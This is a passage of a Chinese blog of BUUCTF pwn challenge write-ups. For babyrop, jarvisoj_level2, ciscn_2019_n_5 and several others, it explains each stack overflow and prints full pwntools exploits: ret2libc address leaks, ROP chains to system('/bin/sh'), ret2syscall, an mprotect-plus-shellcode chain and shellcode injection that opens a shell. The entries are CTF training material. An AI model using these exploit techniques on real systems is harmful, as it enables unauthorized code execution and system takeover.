class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>) + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your choice!&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>,payload_1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">success(hex(puts_addr))</span><br><span class="line">libc = puts_addr - <span class="number">0x0809c0</span></span><br><span class="line">exec_addr = libc + <span class="number">0x4f322</span></span><br><span class="line">payload_2 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>) + p64(exec_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your choice!&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>,payload_2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="babyrop"><a class="header-anchor" href="#babyrop">¶</a>babyrop</h2>
<h3 id="知识点：栈溢出，ret2libc3-v2"><a class="header-anchor" href="#知识点：栈溢出，ret2libc3-v2">¶</a>知识点：栈溢出，ret2libc3</h3>
<p>checksec 检查为32位程序，在ida中查看 main 函数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/%5BOGeek2019%5Dbabyrop/N_%5BU~2C4S~XNGRW%7BLD5%25VBQ.png" alt="">我们先跟进第一个函数 sub_804871F 查看<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/%5BOGeek2019%5Dbabyrop/2DLSOB%29KFYCQWDE~T%29MZXSQ.png" alt="">相关逻辑已经写在注释中，注意观察这里有个 strncmp 函数比较，但在比较前有一个统计长度的<code>strlen</code>函数，该函数遇到<code>\0</code>就会结束，所以我们可以通过传入<code>\0</code>来绕过比较<br>
接下来观察第二个函数 sub_80487D0<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/%5BOGeek2019%5Dbabyrop/FYIEOX22F%5BO8H3UDAAOVBEI.png" alt=""><br>
a1 是前面一个函数的返回值，也就是 buf 数组的第8个字符，所以这里我们只要构造大于 231 就会发生栈溢出，然后就是经典的 ret2libc3了，这里通过泄露 write 函数地址来获得函数的真实地址</p>
<p>接下来就是 buf 的第8个字符串具体要构造多少呢，我们需要考虑 payload 的长度，比如我的payload只需要构造大于或者等于255就行，exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27793</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">bypass = <span class="string">&quot;\0&quot;</span>*<span class="number">7</span> + <span class="string">&quot;\255&quot;</span></span><br><span class="line">p.sendline(bypass)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line"><span class="comment"># main_addr是需要返回的函数地址，构造成write(1, write_got ,8)泄露got表地址，这里a是235，后面p32为4个长度字节，也就是235+4*20=255，所以第8个字符串为255或者大于255都可以</span></span><br><span class="line">payload_1 = <span class="string">&quot;a&quot;</span>*(<span class="number">231</span>+<span class="number">4</span>) +p32(write_plt) +p32(main_addr)+ p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">8</span>) </span><br><span class="line">p.sendlineafter(<span class="string">&quot;Correct\n&quot;</span>, payload_1)</span><br><span class="line">write_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[<span class="number">-4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">success(hex(write_addr))</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">p.sendline(bypass)</span><br><span class="line">payload_2 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">231</span>+<span class="number">4</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Correct\n&quot;</span>, payload_2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-n-8"><a class="header-anchor" href="#ciscn-2019-n-8">¶</a>ciscn_2019_n_8</h2>
<p>checksec 下保护全开，ida 中查看源代码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/%5BOGeek2019%5Dbabyrop/5%5DLV1Z%29VM8G%5BNZ%5BB01UQ%28%24M.png" alt=""><br>
定义的 var 是int数组类型，在内存中占4个字节，即数组中每个元素占4个字节，在下边为13也就是第14个元素的值等于17就能 getshell，exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29967</span>)</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p32(<span class="number">17</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj-level2"><a class="header-anchor" href="#jarvisoj-level2">¶</a>jarvisoj_level2</h2>
<h3 id="知识点：栈溢出，ret2libc1"><a class="header-anchor" href="#知识点：栈溢出，ret2libc1">¶</a>知识点：栈溢出，ret2libc1</h3>
<p>checksec 检查只开启了 NX 保护，打开 ida 查看源代码，跟进 vulnerable_function</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>0x100 &gt; 136，典型的栈溢出，并且在ida中可以看到 system 函数地址为0x08048320，字符串 /bin/sh 地址为0x0804A024，直接写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29257</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">136</span>+<span class="number">4</span>) + p32(<span class="number">0x08048320</span>) + p32(<span class="number">1</span>) + p32(<span class="number">0x0804A024</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="get-started-3dsctf-2016"><a class="header-anchor" href="#get-started-3dsctf-2016">¶</a>get_started_3dsctf_2016</h2>
<h3 id="知识点：栈溢出，覆盖变量-、-ret2syscall"><a class="header-anchor" href="#知识点：栈溢出，覆盖变量-、-ret2syscall">¶</a>知识点：栈溢出，覆盖变量 、 ret2syscall</h3>
<p>checksec 检查为32位程序，并且只开启 NX 保护，ida 打开发现大量函数，直接搜索 main<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/get_started_3dsctf_2016/%40YU1IJA8UWJ%28E2BTRGBRQT1.png" alt=""><br>
gets 函数，典型的栈溢出，搜索后发现还有一个 get_flag 函数，<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/get_started_3dsctf_2016/~4%7BL%2908B8TL%29A%24GTI%5DW%7BNT2.png" alt=""><br>
传入的两个参数满足 if 判断条件就会输出flag，我们可以使其溢出后返回地址为 get_flag 函数，再传入两个参数满足 if 条件，但注意返回的地址要为 exit 函数的地址使其正常退出，感谢前面师傅踩的坑。exp为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27360</span>)</span><br><span class="line"><span class="comment"># 栈空间填充 + get_flag地址 + 返回地址 + a1值 + a2值</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*(<span class="number">56</span>) + p32(<span class="number">0x80489A0</span>) + p32(<span class="number">0x804e6a0</span>) + p32(<span class="number">0x308cd64f</span>) + p32(<span class="number">0x195719d1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>另一种做法是用 ret2syscall 控制程序执行系统调用获取shell，不懂的可以参考我的另一边博文：<a href="https://www.wlhhlc.top/posts/54640/#ret2syscall">https://www.wlhhlc.top/posts/54640/#ret2syscall</a></p>
<p>不过程序里没有 /bin/sh 字符串，所以我们需要自己写入。首先我们把<code>/bin</code>写入到 eax 寄存器中，然后查找了一下，发现 edx 寄存器可以利用，该地址可将 eax 的值复制给 edx 地址指向的值<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/get_started_3dsctf_2016/%40%5BLNT%28YJOKNEXP_SDPU%7D%28%5DJ.png" alt=""><br>
接下来就是找可控地址，vmmap 查找可写的段<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/get_started_3dsctf_2016/RKH%40YVMX_X%7B%28HUF%256%296EMEI.png" alt=""><br>
这里选择 0x080ea000 开始 ，开始编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29119</span>)</span><br><span class="line">pop_eax = <span class="number">0x080b91e6</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806fc30</span></span><br><span class="line">int_80 = <span class="number">0x0806d7e5</span></span><br><span class="line">move_edx_eax_ret = <span class="number">0x080557ab</span></span><br><span class="line"></span><br><span class="line">payload_1 = <span class="string">&quot;a&quot;</span>*(<span class="number">56</span>) + p32(pop_eax) + <span class="string">&#x27;/bin&#x27;</span> + p32(pop_edx_ecx_ebx) + p32(<span class="number">0x080ea000</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(move_edx_eax_ret)</span><br><span class="line">payload_2 = p32(pop_eax) + <span class="string">&#x27;/sh\x00&#x27;</span> + p32(pop_edx_ecx_ebx) + p32(<span class="number">0x080ea000</span>+<span class="number">4</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(move_edx_eax_ret)</span><br><span class="line">payload_3 = p32(pop_eax) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x080ea000</span>) + p32(int_80)</span><br><span class="line">payload = payload_1 + payload_2 + payload_3</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bjdctf-2020-babystack"><a class="header-anchor" href="#bjdctf-2020-babystack">¶</a>bjdctf_2020_babystack</h2>
<h3 id="知识点：栈溢出，ret2text-v4"><a class="header-anchor" href="#知识点：栈溢出，ret2text-v4">¶</a>知识点：栈溢出，ret2text</h3>
<p>checksec 检查为64位程序，只开启 NX 保护，ida 查看伪代码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/get_started_3dsctf_2016/XO1%5B4G_%5BG74%7D%29G4H%24IFFDDD.png" alt=""><br>
因为 read 函数由我们的输入控制长度，所以造成栈溢出，并且有 backdoor 函数，直接写exp打了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26472</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input the length of your name:\n&quot;</span>, <span class="string">&quot;50&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(<span class="number">0x4006e6</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-en-2"><a class="header-anchor" href="#ciscn-2019-en-2">¶</a>ciscn_2019_en_2</h2>
<h3 id="知识点：栈溢出，ret2libc3，栈对齐"><a class="header-anchor" href="#知识点：栈溢出，ret2libc3，栈对齐">¶</a>知识点：栈溢出，ret2libc3，栈对齐</h3>
<p>只是在前面 ciscn_2019_c_1 那题的基础上把环境改成了 ubuntu18，这个时候需要注意栈对齐的问题即可，思路和前面那题一样，就不赘述了，往上翻就可以看到，exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27840</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your choice!\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload_1 = <span class="string">&quot;a&quot;</span>*(<span class="number">0x50</span> + <span class="number">8</span>) + p64(<span class="number">0x0000000000400c83</span>) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>, payload_1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">success(hex(puts_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x0809c0</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f440</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x1b3e9a</span></span><br><span class="line">payload_2 = <span class="string">&quot;a&quot;</span>*(<span class="number">0x50</span> + <span class="number">8</span>) + p64(<span class="number">0x00000000004006b9</span>) + p64(<span class="number">0x0000000000400c83</span>) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your choice!\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>, payload_2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="not-the-same-3dsctf-2016"><a class="header-anchor" href="#not-the-same-3dsctf-2016">¶</a>not_the_same_3dsctf_2016</h2>
<h3 id="知识点：栈溢出，ret2text-v5"><a class="header-anchor" href="#知识点：栈溢出，ret2text-v5">¶</a>知识点：栈溢出，ret2text</h3>
<p>checksec 检测是32位程序，只开启了 NX 保护，丢进 ida 里是一堆函数，先找 main 函数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/not_the_same_3dsctf_2016/K%5B44B7F%7DSJ2GF_98L7F7%25~P.png" alt=""><br>
典型 gets 函数导致的栈溢出漏洞，然后还看见 get_secret 函数可以读取 flag 到 f14g 变量中，只是不输出<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/not_the_same_3dsctf_2016/AI%7BD7B5%25B_PXB8H57%5DWQCQ6.png" alt=""><br>
所以我们需要通过 write 函数输出 f14g 内容，exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25149</span>)</span><br><span class="line">write_addr = <span class="number">0x0806e270</span></span><br><span class="line">get_secret = <span class="number">0x080489a0</span></span><br><span class="line">f14g_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x2d</span> + p32(get_secret) + p32(write_addr) + p32(<span class="number">0</span>) + p32(<span class="number">1</span>) + p32(f14g_addr) + p32(<span class="number">50</span>) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>还有另一种解法是使用 mprotect 函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值</p>
<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p>
<p>1）PROT_READ：表示内存段内的内容可写；</p>
<p>2）PROT_WRITE：表示内存段内的内容可读；</p>
<p>3）PROT_EXEC：表示内存段中的内容可执行；</p>
<p>4）PROT_NONE：表示内存段中的内容根本没法访问</p>
</blockquote>
<p>简单来说就是 mprotect 函数可以帮助我们修改某一区间的内容为可读可写可执行的权限，该函数需要三个参数，所以我们需要找一下三个 pop 和 ret 的地址<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/not_the_same_3dsctf_2016/N4TDP54%24NY~8CA%24NE%60H_XOY.png" alt=""><br>
接着再找可读可写的段<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/not_the_same_3dsctf_2016/4%7D5Z%40D%60E9PMZ9U%28%5D5M3U7T6.png" alt=""><br>
这里我选取 0x080ea000 ，开始编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29085</span>)</span><br><span class="line">pop3_ret = <span class="number">0x0806fcf0</span></span><br><span class="line">mprotect = <span class="number">0x0806ed40</span></span><br><span class="line">bss_addr = <span class="number">0x080ea000</span></span><br><span class="line">mprotect_prot = <span class="number">7</span> <span class="comment"># r+w+x = 4+2+1</span></span><br><span class="line">read_addr = <span class="number">0x0806e200</span></span><br><span class="line"><span class="comment">#填充栈空间+mprotect执行+mprotect返回地址+mprotect三个参数：修改内存地址、修改内存大小、修改的权限</span></span><br><span class="line">payload_1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span> + p32(mprotect) + p32(pop3_ret) + p32(bss_addr) + p32(<span class="number">0x100</span>) + p32(mprotect_prot)</span><br><span class="line"><span class="comment">#执行完pop3_ret后跳到read+返回地址+read函数三个参数+返回到shellcode去执行</span></span><br><span class="line">payload_2 = p32(read_addr) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0x100</span>) + p32(bss_addr)</span><br><span class="line">p.sendline(payload_1 + payload_2)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="HarekazeCTF2019-baby-rop"><a class="header-anchor" href="#HarekazeCTF2019-baby-rop">¶</a>[HarekazeCTF2019]baby_rop</h2>
<h3 id="知识点：栈溢出，ret2libc1-v2"><a class="header-anchor" href="#知识点：栈溢出，ret2libc1-v2">¶</a>知识点：栈溢出，ret2libc1</h3>
<p>64位程序，然后 ida 查看伪代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo -n \&quot;What&#x27;s your name? \&quot;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World, %s!\n&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输入没限制长度导致栈溢出漏洞，并且 ida 里可以看到有 system 和 /bin/sh，直接编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28781</span>)</span><br><span class="line">system = <span class="number">0x0000000000400490</span></span><br><span class="line">binsh = <span class="number">0x0000000000601048</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(<span class="number">0x0000000000400683</span>) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj-level2-x64"><a class="header-anchor" href="#jarvisoj-level2-x64">¶</a>jarvisoj_level2_x64</h2>
<h3 id="知识点：栈溢出，ret2libc1-v3"><a class="header-anchor" href="#知识点：栈溢出，ret2libc1-v3">¶</a>知识点：栈溢出，ret2libc1</h3>
<p>依然典型的栈溢出漏洞，64位程序，所以记得使用 rdi 寄存器地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28519</span>)</span><br><span class="line">system = <span class="number">0x00000000004004C0</span></span><br><span class="line">binsh = <span class="number">0x0000000000600A90</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*(<span class="number">0x80</span>+<span class="number">8</span>) + p64(<span class="number">0x00000000004006b3</span>) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-n-5"><a class="header-anchor" href="#ciscn-2019-n-5">¶</a>ciscn_2019_n_5</h2>
<h3 id="知识点：栈溢出，ret2shellcode"><a class="header-anchor" href="#知识点：栈溢出，ret2shellcode">¶</a>知识点：栈溢出，ret2shellcode</h3>
<p>首先 checksec 检查程序为64位，并且没有开启任何保护<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_n_5/%5DPR5TAL3I11T%60HBI2%7B%29AENR.png" alt=""><br>
ida 查看伪代码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_n_5/1Z5LZNEV%25%241%28~H%5DQ%6004Z8E5.png" alt=""><br>
read 函数读取输入到 name 中，第二个读取输入则用了 gets 函数，造成栈溢出漏洞，这题可以用 retlibc3打，也可以用 ret2shellcode 打，这里我用 ret2shellcode 方便点，首先看一下 name 的地址在 bss 段上<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_n_5/2G%60TGZQS7RI%24%40OKL%40E%29_H6U.png" alt=""><br>
并且 vmmap 查看该地址可写可执行<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_n_5/99%28UB77SHS_J_%7BJ%254I1%28%2457.png" alt=""><br>
所以我们通过 read 函数写入 shellcode 到 name 中，再通过 gets 栈溢出执行 shellcode，exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27304</span>)</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;tell me your name\n&quot;</span>,shellcode)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(<span class="number">0x601080</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;What do you want to say to me?\n&quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="others-shellcode"><a class="header-anchor" href="#others-shellcode">¶</a>others_shellcode</h2>
<p>额，直接 nc 连上去拿flag就可以了</p>
<h2 id="ciscn-2019-ne-5"><a class="header-anchor" href="#ciscn-2019-ne-5">¶</a>ciscn_2019_ne_5</h2>
<h3 id="知识点：栈溢出，ret2libc1-v4"><a class="header-anchor" href="#知识点：栈溢出，ret2libc1-v4">¶</a>知识点：栈溢出，ret2libc1</h3>
<p>checksec 检查程序为32位，丢进 ida 分析，代码有点长，不过逻辑很容易理清<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_ne_5/%249E4CQ%28%7D%29J52O~DYBJWT%5DG2.png" alt=""><br>
首先要输入 admin 的密码为 administrator，然后进去选项中，虽然只列了四个选项，但看代码中 case 还有个隐藏的 case4 选项，首先看第一个<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_ne_5/X%29X%5BBW2J9I%24O%25GMZQ%28ROAY6.png" alt=""><br>
<code>AddLog</code>函数将传参进来的 src ，也就是函数里的 a1 重新取值，其他内容没有什么好看的，直接到第四个<code>GetFlag</code>函数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_ne_5/%28Q61~F%7DO%40A%5B%29%2478V2%5B4F5PS.png" alt=""><br>
这里用 strcpy 进行了复制，但双击 dest 可以看见大小只有 0x48 ，小于 src<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_ne_5/X1MVRGYKP%5B%24%7B_JFOIXA9ZIY.png" alt=""><br>
所以导致了栈溢出漏洞，接下来可以看到已经有了 system 函数，还需要参数<code>/bin/sh</code>，查看字符串<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_ne_5/K8BD%5D423%5DXEM%7D1A2%7BIJ%5B2RC.png" alt=""><br>
发现有一个 fflush，只取sh也可以作为参数执行命令，这里地址是<code>0x080482E6</code>，加上 4 就是字符串<code>sh</code>的地址，即<code>0x080482EA</code>，编写exp</p>
